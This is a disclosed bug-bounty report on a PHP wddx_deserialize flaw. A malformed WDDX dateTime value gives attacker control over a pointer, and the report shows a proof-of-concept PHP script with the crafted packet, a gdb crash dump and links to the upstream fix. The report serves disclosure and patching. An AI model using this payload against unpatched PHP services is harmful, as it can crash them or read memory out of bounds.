# wddx_deserialize allows illegal memory access

## Report Details
- **Report ID**: 161200
- **URL**: https://hackerone.com/reports/161200
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-19T03:13:05.231Z
- **Disclosed**: 2019-10-31T06:21:13.827Z

## Reporter
- **Username**: fms
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information

Upstream Bug
---
2016-08-03 18:36 UTC
https://bugs.php.net/bug.php?id=72749

Summary
--
wddx_deserialize allows to unserialize a WDDX packet that usually comes from external input, while deserializing an invalid dateTime value, wddx_deserialize will parse it in a wrong way and then assign the supplied value as the address of the created variable. This allows illegal memory access. We noted that the problem seems to happen because of the included \r inside the value of the dateTime.

We are able to fully control the register used for reading by specifying it as a date:

```
<?php

// timestamp(2004-09-10T05:52:49+00) = 0x41414131

$xml = <<<XML
<?xml version='1.0'?>
<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>
<wddxPacket version='1.0'>
<header/>
        <data>
                <struct>
                     <var name='aDateTime3'>
                         <dateTime>2\r2004-09-10T05:52:49+00</dateTime>
                     </var>
                 </struct>
        </data>
</wddxPacket>
XML;

$array = wddx_deserialize($xml);
var_dump($array);

$ gdb -q --args /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php -n wdx17.php
No symbol table is loaded.  Use the "file" command.
Breakpoint 1 (__asan_report_error) pending.
Reading symbols from /ramdisk/php-fuzz/phuzzer/php-70//sapi/cli/php...done.
gdb-peda$ r
Starting program: /ramdisk/php-fuzz/phuzzer/php-70/sapi/cli/php -n wdx17.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
array(1) {
  ["aDateTime3"]=>

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffef65ea20 --> 0x41414131 ('1AAA')
RCX: 0x1501b90 (<php_var_dump+1312>:    mov    r13,rbx)
RDX: 0x8282828
RSI: 0x41414131 ('1AAA')
RDI: 0x41414141 ('AAAA')
RBP: 0x7fffffffa280 --> 0x7fffffffa400 --> 0x7fffffffa4e0 --> 0x7fffffffa530 --> 0x7fffffffa550 --> 0x7fffffffa5c0 (--> ...)
RSP: 0x7fffffffa110 --> 0x16ae960 (<php_printf>:        lea    rsp,[rsp-0x98])
RIP: 0x1501bf8 (<php_var_dump+1416>:    mov    rdx,QWORD PTR [rsi+0x10])
R8 : 0xffffdecbd45 --> 0x0
R9 : 0x2451400 --> 0xff0b0578ff0b0ad8
R10: 0x1
R11: 0x0
R12: 0x0
R13: 0xffffdecbd44 --> 0x0
R14: 0x7fffffffa170 --> 0x41b58ab3
R15: 0xffffffff42e --> 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x1501be7 <php_var_dump+1399>:       mov    rcx,QWORD PTR [rsp+0x8]
   0x1501bec <php_var_dump+1404>:       mov    rdx,QWORD PTR [rsp]
   0x1501bf0 <php_var_dump+1408>:       lea    rsp,[rsp+0x98]
=> 0x1501bf8 <php_var_dump+1416>:       mov    rdx,QWORD PTR [rsi+0x10]
   0x1501bfc <php_var_dump+1420>:       lea    r11,[rip+0xf4f1fd]        # 0x2450e00
   0x1501c03 <php_var_dump+1427>:       lea    rsi,[rip+0xf4f1b6]        # 0x2450dc0
   0x1501c0a <php_var_dump+1434>:       test   r12d,r12d
   0x1501c0d <php_var_dump+1437>:       lea    rdi,[rip+0xf4f3ec]        # 0x2451000
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffa110 --> 0x16ae960 (<php_printf>:       lea    rsp,[rsp-0x98])
0008| 0x7fffffffa118 --> 0x28286b8 --> 0x7ffff5689910 (<xmlFreeParserCtxt>:     test   rdi,rdi)
0016| 0x7fffffffa120 --> 0x7fffef676000 --> 0x7fffef676070 --> 0x7fffef6760e0 --> 0x7fffef676150 --> 0x7fffef6761c0 (--> ...)
0024| 0x7fffffffa128 --> 0x7fffef66c158 --> 0x61700000f900 --> 0x611027800013 --> 0x0
0032| 0x7fffffffa130 --> 0x7fffef66c140 --> 0x7fffef66c1e0 --> 0x7fffef66c280 --> 0x7fffef66c320 --> 0x7fffef66c3c0 (--> ...)
0040| 0x7fffffffa138 --> 0x7fffef6140c0 --> 0x7fffef658420 --> 0xc002000700000002
0048| 0x7fffffffa140 --> 0x7fffffffa340 --> 0x0
0056| 0x7fffffffa148 --> 0x7ffff7de68f6 (<_dl_fixup+214>:       mov    r8,rax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000001501bf8 in php_var_dump (struc=struc@entry=0x7fffef65ea20, level=level@entry=0x3) at /home/operac/php-70/ext/standard/var.c:111
111                             php_printf("%sstring(%zd) \"", COMMON, Z_STRLEN_P(struc));
gdb-peda$ p *struc
$1 = {
  value = {
    lval = 0x41414131,
    dval = 5.4090087986211999e-315,
    counted = 0x41414131,
    str = 0x41414131,
    arr = 0x41414131,
    obj = 0x41414131,
    res = 0x41414131,
    ref = 0x41414131,
    ast = 0x41414131,
    zv = 0x41414131,
    ptr = 0x41414131,
    ce = 0x41414131,
    func = 0x41414131,
    ww = {
      w1 = 0x41414131,
      w2 = 0x0
    }
  },
  u1 = {
    v = {
      type = 0x6,
      type_flags = 0x14,
      const_flags = 0x0,
      reserved = 0x0
    },
    type_info = 0x1406
  },
  u2 = {
    var_flags = 0xffffffff,
    next = 0xffffffff,
    cache_slot = 0xffffffff,
    lineno = 0xffffffff,
    num_args = 0xffffffff,
    fe_pos = 0xffffffff,
    fe_iter_idx = 0xffffffff
  }
}
```
Patch
--
```
http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb836a5
```

Fixed for PHP 5.6.25,
--
http://php.net/ChangeLog-5.php


## Attachments
No attachments
